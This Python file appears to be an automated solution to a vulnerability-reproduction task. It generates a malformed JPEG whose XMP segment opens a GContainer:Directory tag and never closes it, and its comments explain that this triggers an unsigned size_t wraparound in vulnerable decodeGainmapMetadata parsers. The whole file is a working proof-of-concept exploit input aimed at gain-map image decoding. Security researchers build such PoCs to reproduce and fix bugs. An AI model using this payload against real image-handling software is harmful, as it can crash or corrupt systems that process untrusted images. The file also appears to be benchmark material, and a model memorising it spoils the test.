import os
import tarfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Try to detect if the source mentions decodeGainmapMetadata and XMP/GContainer to tune payload
        # Fallback to generic minimal PoC otherwise
        want_gcontainer = False
        want_xmp = False
        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    # Limit reading to reasonable size
                    if m.size > 1024 * 1024:
                        continue
                    f = tf.extractfile(m)
                    if not f:
                        continue
                    try:
                        data = f.read()
                    finally:
                        f.close()
                    # Quick heuristics
                    txt = None
                    try:
                        txt = data.decode("utf-8", errors="ignore")
                    except Exception:
                        continue
                    if "decodeGainmapMetadata" in txt:
                        if "GContainer" in txt or "GContainer:Directory" in txt:
                            want_gcontainer = True
                        if "xap/1.0" in txt or "xmp" in txt or "XMP" in txt or "http://ns.adobe.com/xap/1.0/" in txt:
                            want_xmp = True
        except Exception:
            pass

        # Build minimal JPEG with crafted XMP to trigger unsigned wraparound in decodeGainmapMetadata.
        # Strategy: include an opening <GContainer:Directory but omit matching closing, so string search
        # for terminator returns npos, causing size_t underflow in vulnerable versions.
        def build_jpeg_with_xmp(xmp_payload: bytes) -> bytes:
            # APP1 XMP preamble
            preamble = b"http://ns.adobe.com/xap/1.0/\x00"
            app1_data = preamble + xmp_payload
            app1_len = len(app1_data) + 2  # includes length field
            app1 = b"\xFF\xE1" + app1_len.to_bytes(2, "big") + app1_data
            return b"\xFF\xD8" + app1 + b"\xFF\xD9"

        if want_xmp or want_gcontainer:
            # Carefully craft payload. Keep it short but sufficient:
            # Include tokens often searched by gainmap metadata decoders:
            # - GContainer:Directory
            # - GContainer:Item with GainMap semantic (common in Ultra HDR)
            # Omit the closing directory tag to cause npos in searches.
            # Also avoid closing '>' for Directory to potentially trigger further npos computations.
            xmp_core = (
                b"<GContainer:Directory"
                b"><GContainer:Item Semantic='GainMap' Length='1'/>"
                # No closing </GContainer:Directory>
            )
            jpeg = build_jpeg_with_xmp(xmp_core)
            return jpeg

        # Fallback: generic PoC targeting typical XMP-based gain map parser
        xmp_fallback = (
            b"<GContainer:Directory"
            b"><GContainer:Item Semantic='GainMap' Length='1'/>"
        )
        return build_jpeg_with_xmp(xmp_fallback)